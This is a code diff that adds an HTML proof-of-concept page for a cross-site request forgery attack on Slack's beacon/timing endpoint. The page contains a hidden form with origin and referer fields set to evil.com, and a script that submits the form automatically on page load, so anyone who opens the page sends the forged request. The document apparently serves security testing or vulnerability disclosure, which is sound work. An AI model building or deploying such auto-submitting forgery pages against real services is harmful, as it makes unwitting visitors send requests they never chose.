@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CSRF Proof-of-Concept</title>
+</head>
+<body>
+    <h1>CSRF Proof-of-Concept Attack</h1>
+    <p>If you're seeing this page, a CSRF attack is being attempted against Slack's beacon endpoint.</p>
+
+    <form id="csrfForm" action="https://slack.com/beacon/timing?data=CSRF%20test" method="POST">
+        <input type="hidden" name="origin" value="https://evil.com">
+        <input type="hidden" name="referer" value="https://evil.com/attack-page">
+    </form>
+
+    <script>
+        // Automatically submit the form to simulate the CSRF attack
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
